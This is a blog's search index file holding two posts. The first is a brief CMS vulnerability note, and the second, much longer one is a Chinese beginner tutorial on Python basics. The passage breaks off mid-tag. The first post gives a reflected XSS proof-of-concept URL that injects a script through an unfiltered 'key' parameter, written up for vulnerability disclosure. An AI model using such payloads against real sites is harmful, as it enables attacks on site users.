<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Latest version cms vulnerability analysis</title>
      <link href="/2020/03/31/Vulnerability%20analysis%20of%20the%20latest%20version%20of%20cms/"/>
      <url>/2020/03/31/Vulnerability%20analysis%20of%20the%20latest%20version%20of%20cms/</url>
      
        <content type="html"><![CDATA[<p>First prove that there is a reflective XSS vulnerability</p><p>poc：<code>index.php?a=news_list&amp;c=news&amp;key=&lt;sCrIpT&gt;alert(/xss/)&lt;/ScRiPt&gt;&amp;m=</code></p><p><img src="/images/cmsxss1.png" alt></p><p>From the display on the page, it can be clearly seen that the parameter key is not strictly filtered, and it is very simple to cause the xss vulnerability.</p>]]></content>
      
      
      <categories>
          
          <category> Vulnerability analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnerability analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础学习</title>
      <link href="/2020/01/17/Python3%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/01/17/Python3%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=516929058&auto=0&height=66"></iframe><h1 id="安装文本编辑器"><a href="#安装文本编辑器" class="headerlink" title="安装文本编辑器"></a>安装文本编辑器</h1><p>&#8195;在python的交互式命令写程序，虽然一下就能得到结果但是没办法保存，所以我们得下载一个文本编辑器。</p><h2 id="下载安装Visual-Studio-Code"><a href="#下载安装Visual-Studio-Code" class="headerlink" title="下载安装Visual Studio Code"></a>下载安装Visual Studio Code</h2><p>&#8195;官方下载地址：<code>https://code.visualstudio.com/</code>我下载的是deb包，通过使用密令<code>dpkg -i package.deb</code>进行安装，然后点击软件图标就可以打开</p><h2 id="使用文本编辑器"><a href="#使用文本编辑器" class="headerlink" title="使用文本编辑器"></a>使用文本编辑器</h2><p>&#8195;在输入完代码后，保存为以<code>.py</code>结尾的文件,在命令行下<code>python3 file.py</code>就可以执行，如果想要像exe文件内样直接运行<code>.py</code>文件就需要在文件首行输入<code>#!/usr/bin/env python3</code></p><h2 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>&#8195;用<code>print()</code>在括号中加上‘’，就可以再屏幕上输出指定的文字也可以接受多个字符串，用逗号“，”隔开，就可以连成一串输出,也可以打印整数，或者计算结果</p><p><img src="/images/python1.png" alt="python1"></p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>&#8195;有的时候我们需要用户来输入内容，然后根据内容执行一些操作，这个时候就需要用到<code>input()</code>函数。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; name = input()</span><br><span class="line">jack</span><br></pre></td></tr></table></figure><p>&#8195;当输入完jack后，不会有任何显示，我们直接在python交互式命令行输入name就会显示出刚才输入的jack。或者写两行代码，当用户输入完后，把用户输入的打印出来。</p><p><img src="/images/python2.png" alt="python2"></p><p>&#8195;注意：字符串与变量之间一定要用逗号隔开不然会报错。</p><p>&#8195;这个程序还有一点不好就是用户不知道他需要输入什么，所以我们应该写个提示</p><p><img src="/images/python3.png" alt="python3"></p><h3 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h3><p>&#8195;利用<code>print()</code>输出<code>1024 * 768 = xxx</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&apos;1024 * 768 =&apos;,1024*768)</span><br></pre></td></tr></table></figure><h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="数据类型和变量"><a href="#数据类型和变量" class="headerlink" title="数据类型和变量"></a>数据类型和变量</h2><p>&#8195;数据类型：整数、浮点数、字符串、布尔值、空值</p><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>&#8195;当字符串内部包含单引号有包含双引号，我们可以用转义字符<code>\</code>来标识，就比如我们输出的字符串是<code>I&#39;m &quot;OK&quot;！</code></p><p><img src="/images/python4.png" alt="python4"></p><p>&#8195;这个转义字符<code>\</code>可以转义很多字符，比如<code>\n</code>表示换行，<code>\t</code>表示制表符，字符<code>\</code>本身也需要转义</p><p><img src="/images/python5.png" alt="python5"></p><p>&#8195;如果字符串内部有很多字符都需要转义，就需要加很多<code>\</code>,为了简化，python还允许使用<code>r&#39;&#39;</code>表示<code>&#39;&#39;</code>内部的字符串默认</p><p><img src="/images/python6.png" alt="python6"></p><p>&#8195;如果字符串内部有很多换行，用<code>\n</code>写在一行里不好阅读，为了简化，python允许用<code>&#39;&#39;&#39;...&#39;&#39;&#39;</code>的格式表示多行内容</p><p><img src="/images/python7.png" alt="python7"></p><h4 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h4><p>&#8195;一个布尔值只有<code>true</code>、<code>False</code>两种值，要么是<code>true</code>，要么是<code>False</code>，在python中，可以直接使用<code>true</code>、<code>False</code>表示布尔值，也可以通过布尔值计算出来：</p><p><img src="/images/python8.png" alt="python8"></p><p>&#8195;布尔值可以用<code>and</code>、<code>or</code>和<code>not</code>运算。</p><p>&#8195;<code>and</code>运算是与运算，只有所有都为<code>True</code>,<code>and</code>运算结果才是<code>True</code></p><p><img src="/images/python9.png" alt="python9"></p><p>&#8195;<code>or</code>运算是或运算，只要其中有一个为<code>True</code>，<code>or</code>运算结果就是<code>True</code></p><p><img src="/images/python10.png" alt="python10"></p><p>&#8195;<code>not</code>运算是非运算，它是一个单目运算符，把<code>True</code>变成<code>False</code>,<code>False</code>变成<code>True</code></p><p><img src="/images/python11.png" alt="python11"></p><p>&#8195;布尔值经常用在条件判断中</p><p><img src="/images/python12.png" alt="python12"></p><h4 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h4><p>&#8195;空值是python里一个特殊的值，用<code>None</code>表示。<code>None</code>不能理解为<code>0</code>,因为<code>0</code>是有意义的，而<code>None</code>是一个特殊的空值。</p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>&#8195;变量可以是数字，也可以是任意数据类型。变量在程序中就是一个变量名表示了，变量名必须是大小写英文、数字和<code>_</code>的组合，且不能用数字开头，比如</p><p>&#8195;<code>a=1</code>变量<code>a</code>是一个整数</p><p>&#8195;<code>t_007=&#39;T007&#39;</code>变量<code>t_007</code>是一个字符串</p><p>&#8195;<code>abc=True</code>变量<code>abc</code>是一个布尔值<code>True</code></p><p><img src="/images/python13.png" alt="python13"></p><p>&#8195;也可以把一个变量<code>a</code>赋值给另一个变量<code>b</code>，这个操作实际上是把变量<code>b</code>指向变量<code>a</code>所指向的数据</p><p><img src="/images/python14.png" alt="python14"></p><h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><p>&#8195;所谓常量就是不能变的变量，不如常用的数学常数π就是一个长量，在python中，通常用<code>全部大写</code>的变量名表示常量</p><p>&#8195;<code>PI=3.1415926535</code>，但事实上<code>PI</code>仍然是一个变量，python没有任何机制保证<code>PI</code>不会被改变，所以用全部大写的变量名表示常量只是习惯上的用法，如果一定要改变变量<code>PI</code>的值也没人拦。</p><h4 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h4><p>&#8195;python中有两种除法，一种是<code>/</code>另一种是<code>//</code>，使用<code>/</code>计算的结果时浮点数，即使是两个整数恰好整数，结果也是浮点数</p><p><img src="/images/python15.png" alt="python15"></p><p>&#8195;使用<code>//</code>计算的结果为整数，即使除不尽，结果也是整数</p><p><img src="/images/python16.png" alt="python16"></p><p>&#8195;python还提供一个余数运算，可以得到两个整数相除的余数</p><p><img src="/images/python17.png" alt="python17"></p><h2 id="字符串和编码"><a href="#字符串和编码" class="headerlink" title="字符串和编码"></a>字符串和编码</h2><p>&#8195;因计算机只能处理数字，所以如果要处理文本就必须先把文本转换为数字才能处理</p><p>&#8195;在python3版本中，字符串是以Unicode编码的，，也就是说，python的字符串支持多语言</p><p>&#8195;对于单个字符的编码，python提供了函数<code>ord()</code>获取字符的整数表示，函数<code>chr()</code>把编码转换成对应的字符</p><p><img src="/images/python18.png" alt="python18"></p><p>&#8195;如果知道字符的整数编码，还可以用十六进制这么写<code>str</code></p><p><img src="/images/python19.png" alt="python19"></p><p>&#8195;以unicode表示的<code>str</code>通过encode（）方法可以编码为指定的<code>bytes</code></p><p><img src="/images/python20.png" alt="python20"></p><p>&#8195;要是想把<code>bytes</code>变成<code>str</code>，就需要用到<code>decode()</code>方法</p><p><img src="/images/python21.png" alt="python21"></p><p>&#8195;如果<code>bytes</code>中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节</p><p>&#8195;要计算<code>str</code>包含多少个字符，可以用<code>len()</code>函数</p><p><img src="/images/python22.png" alt="python22"></p><p>&#8195;函数<code>len()</code>计算的是<code>str</code>字符数，如果换成<code>bytes</code>，<code>len()</code>函数就计算字节数：</p><p><img src="/images/python23.png" alt="python23"></p><p>&#8195;为了避免乱码问题，应当始终坚持使用UTF-8编码对<code>str</code>和<code>bytes</code>进行转换。所以我们通常会在文件开头写上这两行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br></pre></td></tr></table></figure><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><p>&#8195;我们经常会输出类似<code>亲爱的XXX你好！你XX月的话费是XX，余额是XX</code>之类的字符串，而XXX的内容是根据变量变化的，所以我们需要一种简便的格式化字符串的方式。</p><p>&#8195;在python中是用<code>%</code>实现，例如：</p><p><img src="/images/python24.png" alt="python24"></p><p>&#8195;常用的占位符如下</p><table><thead><tr><th>占位符</th><th>替换内容</th></tr></thead><tbody><tr><td>%d</td><td>整数</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%s</td><td>字符串</td></tr><tr><td>%x</td><td>十六进制整数</td></tr></tbody></table><p>&#8195;有的时候，字符串里面的<code>%</code>是一个普通字符怎么办？这个时候就需要转义，用<code>%%</code>来表示一个<code>%</code></p><p>&#8195;另一种格式化字符串的方法是使用字符串的<code>format（）</code>方法，它会用传入的参数一次替换字符串的占位符<code>{0}</code>、<code>{1}</code>,不过这种方式比较麻烦。</p><p><img src="/images/python25.png" alt="python25"></p><h3 id="使用list和tuple"><a href="#使用list和tuple" class="headerlink" title="使用list和tuple"></a>使用list和tuple</h3><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>&#8195;python内置的一种数据类型是列表：list。list是一种有序的集合，可以随时添加和删除其中的元素。</p><p>&#8195;比如列出所有同学的名字，就可以用一个list表示：</p><p><img src="/images/python26.png" alt="python26"></p><p>&#8195;变量<code>classmates</code>就是一个<code>list</code>,用<code>len()</code>函数可以获得list元素的个数：</p><p><img src="/images/python27.png" alt="python27"></p><p>&#8195;我们可以用索引来访问list中的每一个位置的元素，注意索引是从<code>0</code>开始</p><p><img src="/images/python28.png" alt="python28"></p><p>&#8195;list是一个可变的序表，所以，可以往list中追加元素到末尾</p><p><img src="/images/python29.png" alt="python29"></p><p>&#8195;也可以吧元素插入到指定的位置，比如索引号为<code>1</code>的位置</p><p><img src="/images/python30.png" alt="python30"></p><p>&#8195;要删除list末尾的元素，用<code>pop()</code>方法</p><p><img src="/images/python31.png" alt="python31"></p><p>&#8195;要删除指定位置的元素，用<code>pop(i)</code>方法，其中i是索引位置</p><p><img src="/images/python32.png" alt="python32"></p><p>&#8195;要是把某个元素换成别的元素，可以直接赋值给对应的索引位置</p><p><img src="/images/python33.png" alt="python33"></p><p>&#8195;list元素也可以是另一个list，比如：</p><p><img src="/images/python34.png" alt="python34"></p><p>&#8195;可以看到<code>s</code>只有4个元素，其中<code>s[2]</code>又是一个list，要拿到php就可以写<code>s[2][1]</code></p><h4 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a>tuple</h4><p>&#8195;另一种有序列表叫元组：tuple。tuple和list非常类似，但是tuple一旦初始化就不能修改。比如还是列出同学的名字</p><p><img src="/images/python35.png" alt="python35"></p><p>&#8195;现在这个元组就不能变了，但是可以正常的使用<code>classmates[1],classmates[-1]</code>，但不能赋值成另外的元素</p><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><p>&#8195;计算机之所以能够做很多自动化的任务，因为它可以自己做条件判断。</p><p>&#8195;就比如当用户输入年龄后，根据年龄打印不同的内容，在python程序中用<code>if</code>语句实现：</p><p><img src="/images/python36.png" alt="python36"></p><p>&#8195;根据python的缩进规则，如果<code>if</code>语句判断是<code>True</code>,就把缩进两行的print语句执行了，否则，什么都不做。也可以给<code>if</code>添加一个<code>else</code>语句，意思是，如果<code>if</code>判断是<code>False</code>，不要执行<code>if</code>的内容，去把<code>else</code>执行了：</p><p><img src="/images/python37.png" alt="python37"></p><p>&#8195;我们还可以用<code>elif</code>做的更细致：</p><p><img src="/images/python38.png" alt="python38"></p><p>&#8195;<code>elif</code>是<code>else if</code>的缩写，完全可以有多个<code>elif</code>，所以<code>if</code>语句的完整形式就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件判断1&gt;：</span><br><span class="line">&lt;执行1&gt;</span><br><span class="line">elif&lt;条件判断2&gt;：</span><br><span class="line">&lt;执行2&gt;</span><br><span class="line">elif&lt;条件判断3&gt;:</span><br><span class="line">&lt;执行3&gt;</span><br><span class="line">else:</span><br><span class="line">&lt;执行4&gt;</span><br></pre></td></tr></table></figure><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p>&#8195;有的时候我们会调用input函数让程序更有意思</p><p><img src="/images/python39.png" alt="python39"></p><p>&#8195;可以看到这里用到了<code>int（）</code>函数，这个函数是把字符串转换成整数用的，但如果这个字符串不是合法数字就会报错，程序就退出了。</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>&#8195;要计算1+2+3+….+10000，我们就需要用循环语句。</p><p>&#8195;python的循环有两种，一种是<code>for...in</code>循环，依次把list或tuple中的每个元素迭代出来</p><p><img src="/images/python40.png" alt="python40"></p><p>&#8195;所以<code>for x in ...</code>循环就是把每个元素带入变量<code>x</code>，然后执行缩进块儿的语句。</p><p>&#8195;比如我们想计算1-10整数之和，可以用一个<code>sum</code>变量做累加：</p><p><img src="/images/python41.png" alt="python41"></p><p>&#8195;再比如我们要计算1-100的整数之和，从1写到100有点困难，幸好python提供了一个<code>range()</code>，可以生成整数序列，再通过<code>list()</code>函数可以转换为list，比如<code>range(5)</code>生成的序列是从0开始小于5的整数</p><p><img src="/images/python42.png" alt="python42"></p><p><img src="/images/python43.png" alt="python43"></p><p>&#8195;第二种循环是<code>while</code>循环，只要条件满足，就不断循环，条件不满足时退出循环，比如我们要计算100以内的所有奇数之和，可以用<code>while</code>循环实现：</p><p><img src="/images/python44.png" alt="python43"></p><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p>&#8195;在循环中，<code>break</code>语句可以提前退出循环，例如，本来要循环打印1-100的数字，如果想要提前结束循环，可以用<code>break</code>语句</p><p><img src="/images/python45.png" alt="python43"></p><p>&#8195;由上图可见<code>break</code>的作用就是提前结束循环。</p><h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>&#8195;在循环过程中，也可以通过<code>continue</code>语句，跳过当前的这次循环，直接开始下一次循环</p><p><img src="/images/python46.png" alt="python43"></p><p>&#8195;由上图可见<code>continue</code>的作用是提前结束本轮循环，并直接开始下一轮循环。</p><h3 id="使用dict和set"><a href="#使用dict和set" class="headerlink" title="使用dict和set"></a>使用dict和set</h3><h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><p>&#8195;python内置了字典：dict的支持，使用键-值存储，具有快速的查找速度。用python写一个dict如下：</p><p><img src="/images/python47.png" alt="python43"></p><p>&#8195;把数据放入dict的方法，除了初始化时指定外，还可以通过key放入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;d[&apos;Adam&apos;]=67</span><br><span class="line">&gt;&gt;&gt;d[&apos;Adam&apos;]</span><br><span class="line">67</span><br></pre></td></tr></table></figure><p>&#8195;由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值覆盖掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;d[&apos;jack&apos;]=90</span><br><span class="line">&gt;&gt;&gt;d[&apos;jack&apos;]</span><br><span class="line">&gt;&gt;&gt;90</span><br><span class="line">&gt;&gt;&gt;d[&apos;jack&apos;]=80</span><br><span class="line">&gt;&gt;&gt;d[&apos;jack&apos;]</span><br><span class="line">&gt;&gt;&gt;80</span><br></pre></td></tr></table></figure><p>&#8195;因为key不存在会报错，为了避免因不存在出错，有两种办法，一是通过<code>in</code>判断key是否存在：</p><p><img src="/images/python48.png" alt="python43"></p><p>&#8195;第二种就是通过dict提供的<code>get()</code>方法，如果key不存在，可以返回<code>None</code>，或者自己制定的value</p><p><img src="/images/python49.png" alt="python43"></p><p>&#8195;要删除一个key，可以用<code>pop(key)</code>方法，对应的value也会从dict中删除：</p><p><img src="/images/python50.png" alt="python43"></p><p>&#8195;list是可变的，所以不能作为key</p><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>&#8195;set和dict类似，也是一组key的集合，但是不储存value值，由于key不能重复，所以在set中，没有重复的key。</p><p>&#8195;要创建一个set，需要提供一个list作为输入集合</p><p><img src="/images/python51.png" alt="python43"></p><p>&#8195;传入的参数如果有重复的元素就会被过滤</p><p>&#8195;可以通过<code>add(key)</code>方法添加元素到set中，可以重复添加，但不会有效果</p><p><img src="/images/python52.png" alt="python43"></p><p>&#8195;可以通过<code>remove(key)</code>方法删除元素</p><p><img src="/images/python53.png" alt="python43"></p><p>&#8195;两个set可以做数学意义上的交集、并集操作</p><p><img src="/images/python54.png" alt="python43"></p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><p>&#8195;python内置了很多有用的函数，我们可以直接调用，要想调用一个函数，我们就需要知道这个函数的名称和参数。比如求绝对值的函数<code>abs</code>，只有一个参数，可以直接从python的官方网站查看文档，也可以在交互式命令行通过<code>help(abs)</code>查看<code>abs</code>函数的帮助信息</p><p><img src="/images/python55.png" alt="python43"></p><p>&#8195;python内置的常用函数还包括数据类型转换函数，比如<code>int()</code>函数可以把其他数据类型转换为整数：</p><p><img src="/images/python56.png" alt="python43"></p><p>&#8195;我们也可以把一个函数名赋给一个变量，相当于给这个函数起了一个别名</p><p><img src="/images/python57.png" alt="python43"></p><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><p>&#8195;在python中定义一个函数要使用<code>def</code>语句，依次写出函数名、括号、括号中的参数和冒号<code>:</code>，然后，在缩进块儿中编写函数体，函数的返回值用<code>return</code>语句返回，我们现在来自定义一个求绝对值的函数<code>myself_abs</code>函数为例</p><p><img src="/images/python58.png" alt="python43"></p><p>&#8195;这里我把自定义函数<code>myself_abs()</code>保存为hello.py文件了，我们就可以在当前目录下启动python解析器，用<code>from hello import myself_abs</code>来导入函数<code>myself_abs()</code>。</p><p><img src="/images/python59.png" alt="python43"></p><h3 id="空函数"><a href="#空函数" class="headerlink" title="空函数"></a>空函数</h3><p>&#8195;如果想定义一个什么事都不做的空函数，可以用<code>pass</code>语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def nop()</span><br><span class="line">pass</span><br></pre></td></tr></table></figure><p>&#8195;pass可以用来作为占位符，比如现在还没想好怎么写函数的代码，就可以先放一个pass，让代码运行起来。</p><h2 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h2><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><p>&#8195;我们先写一个计算X²的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def power(x)</span><br><span class="line">return x*x</span><br></pre></td></tr></table></figure><p>&#8195;对于<code>power(x)</code>函数，参数x就是一个位置参数，当我们调用power函数时，必须传入有且仅有一个参数x的值，但是如果我们要计算x的三次方，四次方，我们不可能无线创建多个函数，所以，我们可以把<code>power(x)</code>修改为<code>power(x,n)</code></p><p><img src="/images/python60.png" alt="python43"></p><h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>&#8195;我们新函数<code>power(x,n)</code>函数定义没有问题，但是，旧的调用代码失败了，原因是我们增加了一个参数，导致旧的代码因为缺少一个参数而无法正常调用，这个时候默认参数就派上用场了，由于我们经常计算x²，所以完全可以把第二个参数n的默认值设定为2</p><p><img src="/images/python61.png" alt="python43"></p><p>&#8195;需要注意一点，默认参数必须指向不变对象来实现：</p><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>&#8195;在python函数中，还可以定义可变参数，顾名思义，可变参数就是传入的参数个数是可变的，比如我们要计算a²+b²+c²+。。。。，要定义这个函数，我们就必须确定输入的参数，由于参数个数不确定，我们首先想到可以把a+b+c作为一个list或tuple传进来</p><p><img src="/images/python62.png" alt="python43"></p><p>&#8195;由上图可以看到调用的时候需要先组装出一个lis或tuple，如果利用可变参数，就不需要这么麻烦了</p><p><img src="/images/python63.png" alt="python43"></p><p>&#8195;如果已经有一个list或者tuple，要调用一个可变参数，我们可以这样做：</p><p><img src="/images/python64.png" alt="python43"></p><p>&#8195;有没有发现好麻烦，所以python允许在list或tuple前面加一个<code>*</code>号，把list或tuple的元素变成可变参数传进去：</p><p><img src="/images/python65.png" alt="python43"></p><h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>&#8195;可变参数允许你传入0个或任意个参数，这些可变参数会在函数调用时自动组装为tuple，而关键字参数允许你传入0个或任意个含有参数名的参数，这些关键字参数在函数内部自动组成一个dict</p><p><img src="/images/python66.png" alt="python43"></p><p>&#8195;可以看到kw就是关键字参数，只要在他前面加上两个*就可以，关键参数可以拓展函数功能，就比如在<code>person</code>函数里，我们能保证接收到name和age，但是如果调用者提供更多的参数，我们也可以接受到。</p><p>&#8195;和可变参数类似，也可以先组装出一个dict，然后，把该dict转换为关键字参数传进去</p><p><img src="/images/python67.png" alt="python43"></p><p>&#8195;<code>**extra</code>表示把<code>extra</code>这个dict的所有key-value用关键字参数传入到函数的<code>**kw</code>参数，<code>kw</code>将获得一个dict，注意<code>kw</code>获得的dict是<code>extra</code>的一份拷贝，对<code>kw</code>的改动不会影响到函数的<code>extra</code></p><h3 id="命名关键字参数"><a href="#命名关键字参数" class="headerlink" title="命名关键字参数"></a>命名关键字参数</h3><p>&#8195;对于关键字参数，函数的调用者可以传入任意不受限制的关键字参数。至于到底传入了哪些，就需要在函数内部通过<code>kw</code>检查。仍以<code>person</code>函数为例，我们希望检查是否有<code>city</code>和<code>job</code>参数：</p><p><img src="/images/python68.png" alt="python43"></p><p>&#8195;但很显然调用者仍可以传入不受限制的关键字参数</p><p><img src="/images/python69.png" alt="python43"></p><p>&#8195;如果要限制关键字参数的名字，就可以用命名关键字参数，例如，只接收<code>city</code>和<code>job</code>作为关键字参数</p><p><img src="/images/python70.png" alt="python43"></p><h3 id="参数组合"><a href="#参数组合" class="headerlink" title="参数组合"></a>参数组合</h3><p>&#8195;在python中定义函数，可以用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数都可以组合使用。但是要注意参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。</p><p>&#8195;比如定义一个函数，包含了上述若干种参数</p><p><img src="/images/python71.png" alt="python43"></p><h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>&#8195;如果一个函数在内部调用自己本身，这个函数就是递归函数。</p><p>&#8195;举个例子，我们计算阶乘<code>n! =1x2x3x4x....xn</code>用函数<code>fact(n)</code>表示，可以看出：fact（n）=n!=1x2x3x…x(n-1)xn=(n-1)!xn=fact(n-1)xn,所以<code>fact(n)</code>可以表示为<code>n x fact(n-1)</code>，只有<code>n-1</code>时需要特殊处理。于是<code>fact(n)</code>用递归的方式写出来就是：</p><p><img src="/images/python72.png" alt="python43"></p><p>&#8195;使用递归函数需要注意防止栈溢出，在计算机中，函数的调用时通过栈这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会返回一层栈帧，由于栈的大小不是无限的，所以，递归调用的次数太多，会导致栈溢出</p><p>&#8195;解决递归调用栈溢出的方法是通过尾递归优化，事实上尾递归和循环的效果是一样的，所以把循环看成是一种特殊的尾递归函数也可以。</p><p><img src="/images/python73.png" alt="python43"></p><p>&#8195;尾递归调用时，如果做了优化，栈不会增长，因此，无论多少次代用也不会导致栈溢出。</p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h3><p>&#8195;python本身就内置了很多非常有用的模块，只要安装完毕，这些模块就可以立即使用。我们以内建的模块<code>sys</code>为例，编写一个<code>hello</code>的模块。</p><p><img src="/images/python74.png" alt="python43"></p><p>&#8195;第1行和第2行是注释，第一行注释可以让这个文件在unix/linux/mac上运行，第二行注释表示。py文件本身使用标准UTF–8编码；第四行是一个字符串，也就是这个模块的文档注释，任何模块的第一个字符串都被视为模块的文档注释；</p><p>&#8195;第六行使用<code>__author__</code>变量把作者写进去，这样当公开源码别人就能瞻仰你的大名；</p><p>&#8195;以上就是python模块的标准文档模板，当然也可以全部删掉不写</p><p>&#8195;最后两行是当我们在命令运行<code>hello</code>模块文件时，python解析器把一个特殊变量<code>__name__</code>置为<code>__main__</code>，而如果在其他地方导入该<code>hello</code>模块时，<code>if</code>判断将失败，因此，这种<code>if</code>测试可以让一个模块通过命令行运行时执行一些额外的代码，最常见的就是运行测试。</p><p><img src="/images/python75.png" alt="python43"></p><p>&#8195;如果启动交互环境，直接导入test模块时没有打印hello，world的，因为没有执行test（）函数，当我们调用test.test()时，才会打印出来。</p><p><img src="/images/python76.png" alt="python43"></p><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>&#8195;在一个模块中，我们可能会定义很多函数，但有的函数和变量我们希望给别人使用，有的函数和变量我们希望仅仅在模块内部使用。在python中是通过<code>_</code>前缀来实现的。</p><p>&#8195;正常的函数和变量名是公开的，可以被直接饮用，比如:<code>abc</code>,<code>x123</code>,<code>PI</code>等；</p><p>&#8195;类似<code>__XXX__</code>这样的变量时特殊变量，可以被直接引用，但是有特殊用途，比如上面的<code>__author__</code>,<code>__name__</code>就是特殊变量，<code>hello</code>模块定义的文档注释也可以用特殊变量<code>__doc__</code>访问，我们自己的变量一般不要用这种变量名；</p><p>&#8195;类似<code>_xxx</code>和<code>__xxx</code>这样的函数或变量就是非公开的，不应该被直接引用，比如<code>_abc</code>,<code>__abc</code>等；</p><p>&#8195;private函数或变量不应该被别人引用，那它有什么用呢？请看例子：</p><p><img src="/images/python77.png" alt="python43"></p><p>&#8195;我们在模块里公开<code>greeting()</code>函数，而把内部逻辑用private函数隐藏起来了，这样调用<code>greeting()</code>函数不用关心内部的private细节，这也是一种非常有用的代码封装和抽象的方法，即：外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。</p><h2 id="安装第三方模块"><a href="#安装第三方模块" class="headerlink" title="安装第三方模块"></a>安装第三方模块</h2><p>&#8195;在python中，安装第三方模块，是通过管理工具pip完成的</p><p>&#8195;只要我们知道模块名就可以安装，比如pillow，安装命令就是<code>pip install Pillow</code></p><h3 id="安装常用模块"><a href="#安装常用模块" class="headerlink" title="安装常用模块"></a>安装常用模块</h3><p>&#8195;我们一个个安装模块很费时，还要考虑兼容性问题，我们可以直接安装<code>Anaconda</code>，它内置了许多非常有用的第三方库，只要安装上<code>Anaconda</code>,就相当于吧数十个第三方模块自动装好了，非常简单易用。<code>https://www.anaconda.com/distribution</code>在这个官网下载后直接安装就可以，然后就直接<code>import numpy</code>等已安装的第三方模块。</p><h3 id="模糊搜索路径"><a href="#模糊搜索路径" class="headerlink" title="模糊搜索路径"></a>模糊搜索路径</h3><p>&#8195;当我们视图加载一个模块时，python会在指定的路径下搜索对应的.py文件，如果找不到，就会报错：</p><p><img src="/images/python78.png" alt="python43"></p><p>&#8195;默认情况下，python解析器会搜索当前目录，所有已经安装好的内置模块和第三方模块，搜索路径放在sys模块的path变量汇总</p><p><img src="/images/python79.png" alt="python43"></p><p>&#8195;如果要添加自己的搜索目录，有两种方法：</p><p>&#8195;一种直接修改<code>sys.path</code>，添加要搜索的目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 